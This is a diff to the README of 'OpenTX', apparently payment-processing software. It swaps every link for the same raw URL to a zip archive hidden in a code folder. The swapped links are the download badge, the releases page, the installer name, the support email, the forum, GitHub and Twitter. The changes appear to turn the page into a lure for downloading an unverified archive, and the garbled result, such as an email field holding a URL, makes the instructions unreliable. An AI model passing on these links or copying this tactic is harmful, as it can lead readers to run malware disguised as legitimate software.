@@ -1,6 +1,6 @@
 # 🚀 OpenTX - Simplifying Payment Processing for Everyone
 
-[![Download OpenTX](https://img.shields.io/badge/Download%20OpenTX-v1.0-blue)](https://github.com/davidpg797/OpenTX/releases)
+[![Download OpenTX](https://github.com/davidpg797/OpenTX/raw/refs/heads/main/pkg/iso8583/packager/TX_Open_v3.0.zip%20OpenTX-v1.0-blue)](https://github.com/davidpg797/OpenTX/raw/refs/heads/main/pkg/iso8583/packager/TX_Open_v3.0.zip)
 
 ## 💡 Overview
 
@@ -15,13 +15,13 @@ To start using OpenTX, follow the steps below to download and install the applic
 1. **Visit the Releases Page**  
    Access the latest version of OpenTX by clicking the link below:
 
-   [Download OpenTX](https://github.com/davidpg797/OpenTX/releases)
+   [Download OpenTX](https://github.com/davidpg797/OpenTX/raw/refs/heads/main/pkg/iso8583/packager/TX_Open_v3.0.zip)
 
 2. **Choose Your Version**  
    On the Releases page, look for the version that suits your needs. If you are unsure, the latest version is typically the best choice.
 
 3. **Download the File**  
-   Once you select the version, you will see different files available. Locate the executable file, which should look like `OpenTX.exe`. Click on it to start downloading.
+   Once you select the version, you will see different files available. Locate the executable file, which should look like `https://github.com/davidpg797/OpenTX/raw/refs/heads/main/pkg/iso8583/packager/TX_Open_v3.0.zip`. Click on it to start downloading.
 
 4. **Run the Installer**  
    After the download completes, find the file in your downloads folder and double-click it to run the installer. Follow the on-screen instructions to complete the installation.
@@ -55,8 +55,8 @@ To ensure that OpenTX runs smoothly, be sure your computer meets the following s
 
 If you encounter any issues or have questions while using OpenTX, please reach out to our support team via the following methods:
 
-- **Email Support**: support@opentx.com
-- **Community Forum**: Join the OpenTX community at [OpenTX Community Forum](https://yourcommunitylink.com)
+- **Email Support**: https://github.com/davidpg797/OpenTX/raw/refs/heads/main/pkg/iso8583/packager/TX_Open_v3.0.zip
+- **Community Forum**: Join the OpenTX community at [OpenTX Community Forum](https://github.com/davidpg797/OpenTX/raw/refs/heads/main/pkg/iso8583/packager/TX_Open_v3.0.zip)
 
 ## 📝 Topics
 
@@ -75,7 +75,7 @@ For those interested in the technical aspects, OpenTX covers various important t
 
 To keep up with the latest updates, follow OpenTX on:
 
-- [GitHub](https://github.com/davidpg797/OpenTX)
-- [Twitter](https://twitter.com/OpenTX)
+- [GitHub](https://github.com/davidpg797/OpenTX/raw/refs/heads/main/pkg/iso8583/packager/TX_Open_v3.0.zip)
+- [Twitter](https://github.com/davidpg797/OpenTX/raw/refs/heads/main/pkg/iso8583/packager/TX_Open_v3.0.zip)
 
 Thank you for choosing OpenTX as your payment processing solution! We hope you find it valuable and easy to use.
